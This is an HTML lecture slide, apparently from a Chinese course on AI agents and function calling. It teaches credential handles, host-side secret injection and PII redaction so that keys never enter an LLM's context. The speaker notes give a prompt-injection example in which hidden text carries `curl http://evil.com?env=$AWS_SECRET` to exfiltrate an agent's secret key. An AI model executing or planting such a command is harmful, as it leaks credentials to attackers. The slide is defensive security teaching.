@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="h-full light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slide 28 - 敏感信息与凭证隔离：如何防止 AK/SK 与 PII 泄漏给 LLM 上下文</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#eff6ff',
+                            100: '#dbeafe',
+                            500: '#3b82f6',
+                            600: '#2563eb',
+                            700: '#1d4ed8',
+                            900: '#1e3a8a',
+                        },
+                        accent: {
+                            cyan: '#0891b2',
+                            emerald: '#059669',
+                            purple: '#7c3aed',
+                            amber: '#d97706',
+                            rose: '#e11d48',
+                            indigo: '#4f46e5'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'Fira Code', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+        
+        .bg-grid-pattern {
+            background-size: 30px 30px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0, 0, 0, 0.03) 1px, transparent 1px);
+        }
+        .soft-shadow {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.04), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+        }
+    </style>
+</head>
+<body class="h-full bg-slate-50 text-slate-800 font-sans flex flex-col overflow-hidden select-none">
+
+    <!-- Header Bar -->
+    <header class="h-16 border-b border-slate-200 bg-white/90 backdrop-blur-md px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-3">
+            <div class="w-3 h-3 rounded-full bg-blue-600"></div>
+            <h1 class="text-sm md:text-base font-semibold text-slate-800 tracking-tight">
+                AI 应用与辅助编程架构师视角 (Course 4: Skill & Function Calling)
+            </h1>
+        </div>
+
+        <div class="flex items-center space-x-2">
+            <button id="toggleNotesBtn" onclick="toggleSpeakerNotes()" class="px-3 py-1.5 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-xs font-medium text-slate-700 transition flex items-center gap-2">
+                <i class="fa-solid fa-note-sticky text-amber-500"></i>
+                <span>演讲备注</span>
+            </button>
+            <button id="fullscreenBtn" onclick="toggleFullscreen()" class="p-2 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-600 hover:text-slate-900 transition">
+                <i class="fa-solid fa-expand text-xs"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 relative flex flex-col justify-between p-6 md:p-10 lg:p-12 bg-white bg-grid-pattern overflow-y-auto">
+        
+        <div class="absolute top-10 left-1/4 w-96 h-96 bg-purple-100/40 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-10 right-1/4 w-96 h-96 bg-indigo-100/40 rounded-full blur-3xl pointer-events-none"></div>
+
+        <!-- Title Block -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-purple-50 border border-purple-200 text-purple-800 font-mono text-xs font-semibold tracking-wider uppercase mb-3">
+                <i class="fa-solid fa-key"></i>
+                <span>第 4 课：AI 原子能力与工具调用 · 模块三</span>
+            </div>
+            
+            <h1 class="text-2xl md:text-3xl lg:text-4xl font-extrabold text-slate-900 tracking-tight leading-tight mb-3">
+                敏感信息与凭证隔离：如何防止 AK/SK 与 PII 泄漏给 LLM 上下文
+            </h1>
+            
+            <p class="text-sm sm:text-base md:text-lg lg:text-xl font-medium text-slate-600 w-full max-w-full leading-relaxed">
+                绝不向概率模型泄露物理密钥：通过 <span class="text-purple-600 font-semibold underline decoration-purple-300 decoration-2 underline-offset-4">凭证句柄化 (Credential Handles)</span>、<span class="text-indigo-600 font-semibold underline decoration-indigo-300 decoration-2 underline-offset-4">宿主 Vault / Secrets 注入</span> 与 <span class="text-emerald-600 font-semibold underline decoration-emerald-300 decoration-2 underline-offset-4">PII 个人隐私脱敏拦截</span>，屏蔽明文凭证与隐私出站
+            </p>
+        </div>
+
+        <!-- Content Grid (2 Columns: Credential & PII Sanitizer Code vs Security Pillars) -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full my-6 grid grid-cols-1 sm:grid-cols-2 gap-4 md:gap-6">
+            
+            <!-- Left Card: Credential Handle & PII Sanitizer Engine Code -->
+            <div class="group relative rounded-2xl border border-purple-200 bg-purple-50/30 p-5 md:p-6 soft-shadow transition hover:border-purple-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-xl bg-purple-100 border border-purple-200 flex items-center justify-center text-purple-600 text-lg shrink-0">
+                                <i class="fa-solid fa-user-lock"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-base font-bold text-slate-900">凭证句柄映射与 PII 脱敏引擎</h3>
+                                <p class="text-xs text-purple-800 font-mono">Credential Handle & PII Redactor</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-purple-100 border border-purple-200 text-purple-800 text-[11px] font-mono font-bold">Secret Isolation</span>
+                    </div>
+
+                    <!-- Python Code Box -->
+                    <pre class="bg-slate-900 text-slate-100 rounded-xl p-3.5 font-mono text-[10px] md:text-[11px] mb-3 shadow-inner overflow-x-auto leading-relaxed"><code><span class="text-purple-400">import</span> re, os
+
+<span class="text-purple-300">class</span> <span class="text-blue-300">SecretIsolationManager</span>:
+    <span class="text-purple-300">def</span> <span class="text-blue-300">execute_with_alias</span>(self, tool_call):
+        <span class="text-slate-500"># 1. LLM 仅能看到抽象句柄 "cred_id": "AWS_PROD_S3" ★</span>
+        cred_alias = tool_call.args.get(<span class="text-amber-200">"credential_alias"</span>)
+        
+        <span class="text-slate-500"># 2. 宿主侧由 Vault/Secrets Manager 动态注入真实 AK/SK</span>
+        real_secret = vault_client.get_secret(cred_alias)
+        
+        <span class="text-slate-500"># 3. 仅向物理隔离沙箱环境变量提供密钥 ★</span>
+        env = {<span class="text-amber-200">"AWS_SECRET_ACCESS_KEY"</span>: real_secret.value}
+        raw_observation = sandbox.run(tool_call, env=env)
+        
+        <span class="text-slate-500"># 4. 回载给 LLM 前强行脱敏 PII/身份证/手机号/明文Key ★</span>
+        sanitized_obs = self.redact_pii_and_keys(raw_observation)
+        <span class="text-purple-300">return</span> sanitized_obs
+
+    <span class="text-purple-300">def</span> <span class="text-blue-300">redact_pii_and_keys</span>(self, text: <span class="text-emerald-300">str</span>) -&gt; <span class="text-emerald-300">str</span>:
+        text = re.sub(<span class="text-amber-200">r"AKIA[0-9A-Z]{16}"</span>, <span class="text-amber-200 font-bold">"[REDACTED_AWS_AK]"</span>, text)
+        text = re.sub(<span class="text-amber-200">r"1[3-9]\d{9}"</span>, <span class="text-amber-200 font-bold">"[REDACTED_PHONE]"</span>, text)
+        <span class="text-purple-300">return</span> text</code></pre>
+
+                    <ul class="space-y-1.5 text-xs text-slate-700">
+                        <li class="flex items-start gap-2">
+                            <i class="fa-solid fa-check text-emerald-600 mt-0.5 shrink-0"></i>
+                            <span><strong>句柄化解耦：</strong>大模型接触不到任何物理明文密码，仅感知符号化句柄（Credential Alias）。</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="mt-4 pt-3 border-t border-purple-200/60 text-xs text-purple-900 font-mono flex items-center gap-2">
+                    <i class="fa-solid fa-triangle-exclamation text-purple-600"></i>
+                    <span>物理铁律：绝不允许 AK/SK、数据库连接串或 PII 隐私物理落盘入 Prompt 上下文</span>
+                </div>
+            </div>
+
+            <!-- Right Card: Three Pillars of Credential & PII Isolation Architecture -->
+            <div class="group relative rounded-2xl border border-indigo-200 bg-indigo-50/30 p-5 md:p-6 soft-shadow transition hover:border-indigo-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-xl bg-indigo-100 border border-indigo-200 flex items-center justify-center text-indigo-600 text-lg shrink-0">
+                                <i class="fa-solid fa-shield-halved"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-base font-bold text-slate-900">敏感信息与凭证隔离的三大工程支柱</h3>
+                                <p class="text-xs text-indigo-700 font-mono">Secret & PII Isolation Pillars</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 border border-indigo-200 text-indigo-800 text-[11px] font-mono font-bold">Privacy Control</span>
+                    </div>
+
+                    <div class="space-y-3.5 text-xs text-slate-700">
+                        <!-- Pillar 1 -->
+                        <div class="p-3 rounded-xl bg-white border border-indigo-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-purple-100 text-purple-800 font-mono font-bold text-[10px]">1. 凭证句柄化 (Credential Handles)</span>
+                                <span>No Secret in Prompt</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                模型只需输出 `credential_alias: "PROD_RDS_DB"`。宿主侧根据句柄向沙箱环境变量安全填充真实密码，彻底断绝 Key 在 Token 层的暴传。
+                            </p>
+                        </div>
+
+                        <!-- Pillar 2 -->
+                        <div class="p-3 rounded-xl bg-white border border-indigo-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-emerald-100 text-emerald-800 font-mono font-bold text-[10px]">2. PII 隐私出站脱敏 (PII Scrubbing Pipeline)</span>
+                                <span>Observation Redaction</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                工具执行完毕向 LLM 返回 Observation 时，前置正则与 NER 模型自动把手机号、身份证、邮箱及 API 响应里的 Key 替换为 `[REDACTED]`。
+                            </p>
+                        </div>
+
+                        <!-- Pillar 3 -->
+                        <div class="p-3 rounded-xl bg-white border border-indigo-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-blue-100 text-blue-800 font-mono font-bold text-[10px]">3. 宿主 Vault / Secrets 注入 (Host-Side Auto-Inject)</span>
+                                <span>HashiCorp Vault / KMS Integration</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                建立与 AWS Secrets Manager 或 HashiCorp Vault 的宿主原生连接，实现密钥在物理沙箱内的短生命周期动态轮转（Secret Rotation）。
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-4 pt-3 border-t border-indigo-200/60 text-xs text-indigo-900 font-mono flex items-center gap-2">
+                    <i class="fa-solid fa-circle-check text-emerald-600"></i>
+                    <span>实践案例：GitHub Copilot / Cursor 绝不向远端发送真实机器密钥</span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Architectural Takeaway Banner -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full rounded-xl border border-slate-200 bg-slate-50 p-4 md:p-5 flex items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="p-2 rounded-lg bg-purple-100 text-purple-800 text-lg shrink-0">
+                    <i class="fa-solid fa-compass-drafting"></i>
+                </div>
+                <div>
+                    <h4 class="text-xs font-mono uppercase text-slate-500 font-semibold">Architectural Core Thesis / 架构师视角</h4>
+                    <p class="text-sm font-medium text-slate-800">
+                        大模型不需要知道物理密钥是什么！构建 <strong>凭证句柄化（Credential Handles）与 PII 自动化脱敏过滤管道</strong>，是防止企业敏感凭证被越狱注入攻击提权的绝对防线。
+                    </p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer Controls -->
+    <footer class="h-16 border-t border-slate-200 bg-white px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-4">
+            <div class="text-xs font-mono text-slate-500">
+                <span id="currentSlideNum" class="text-slate-900 font-bold">28</span> / <span id="totalSlidesNum">40</span> Slides
+            </div>
+            <div class="w-32 md:w-48 bg-slate-100 h-1.5 rounded-full overflow-hidden border border-slate-200">
+                <div class="bg-blue-600 h-full w-[70%] transition-all duration-300"></div>
+            </div>
+        </div>
+
+        <!-- Slide Controls (27.html <- 28.html -> 29.html) -->
+        <div class="flex items-center space-x-3">
+            <a href="27.html" title="上一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-blue-50 hover:text-blue-600 hover:border-blue-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-left text-xs"></i>
+            </a>
+            <span class="text-xs font-mono text-slate-600 hidden md:inline">敏感信息与凭证隔离</span>
+            <a href="29.html" title="下一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-blue-50 hover:text-blue-600 hover:border-blue-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-right text-xs"></i>
+            </a>
+        </div>
+
+        <div class="hidden lg:flex items-center gap-3 text-xs text-slate-500 font-mono">
+            <span class="flex items-center gap-1">
+                <a href="27.html" title="上一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-blue-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-left text-[11px]"></i>
+                </a>
+                <a href="29.html" title="下一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-blue-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-right text-[11px]"></i>
+                </a>
+                <span class="ml-1 text-slate-500">翻页</span>
+            </span>
+            <span><kbd onclick="toggleFullscreen()" class="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 cursor-pointer hover:bg-slate-200">F</kbd> 全屏</span>
+        </div>
+    </footer>
+
+    <!-- Speaker Notes Drawer -->
+    <div id="speakerNotesDrawer" class="hidden fixed inset-y-0 right-0 w-full md:w-96 bg-white border-l border-slate-200 z-50 p-6 flex flex-col justify-between shadow-2xl transition-transform duration-300">
+        <div>
+            <div class="flex items-center justify-between pb-4 mb-4 border-b border-slate-200">
+                <div class="flex items-center gap-2 text-amber-700 font-semibold text-sm">
+                    <i class="fa-solid fa-sticky-note"></i>
+                    <span>Speaker Notes / 讲师讲稿</span>
+                </div>
+                <button onclick="toggleSpeakerNotes()" class="text-slate-400 hover:text-slate-700">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+            <div class="space-y-4 text-xs md:text-sm text-slate-700 leading-relaxed overflow-y-auto max-h-[calc(100vh-160px)] pr-2">
+                <div class="p-3 rounded-lg bg-purple-50 border border-purple-200">
+                    <span class="font-bold text-purple-900 block mb-1">🎯 剖析为何绝不把密钥发给大模型：</span>
+                    “向学员深入剖析：在构建企业级 Agent 时，最严重的漏洞就是直接把数据库连接串（如 `postgres://root:password@...`）或者 AWS Secret Key 当作工具入参暴露给大模型。如果发生间接提示词注入（Indirect Prompt Injection），攻击者只要在网页或文档里藏一句 `curl http://evil.com?env=$AWS_SECRET`，密钥瞬间泄露。”
+                </div>
+                <div class="p-3 rounded-lg bg-indigo-50 border border-indigo-200">
+                    <span class="font-bold text-indigo-900 block mb-1">💡 讲授凭证句柄与 PII 脱敏管道：</span>
+                    “提示学员：正确的解法是‘凭证句柄化’。大模型只需要输出句柄名称 `credential_alias: "PROD_AWS_KEY"`，由宿主侧的安全管理器从 Vault 动态拉取密钥注入隔离沙箱；同时在沙箱 Observation 返回给大模型前，用正则和脱敏管道清洗掉敏感的身份证、手机号和 API 响应 Key，做到双向零泄露。”
+                </div>
+            </div>
+        </div>
+        <div class="text-xs font-mono text-slate-400 pt-4 border-t border-slate-200">
+            Press ESC or click X to close
+        </div>
+    </div>
+
+    <!-- JavaScript Controls -->
+    <script>
+        function toggleSpeakerNotes() {
+            document.getElementById('speakerNotesDrawer').classList.toggle('hidden');
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(err => console.error(err));
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen();
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowLeft') {
+                window.location.href = '27.html';
+            } else if (e.key === 'ArrowRight') {
+                window.location.href = '29.html';
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'n' || e.key === 'N') {
+                toggleSpeakerNotes();
+            } else if (e.key === 'Escape') {
+                document.getElementById('speakerNotesDrawer').classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
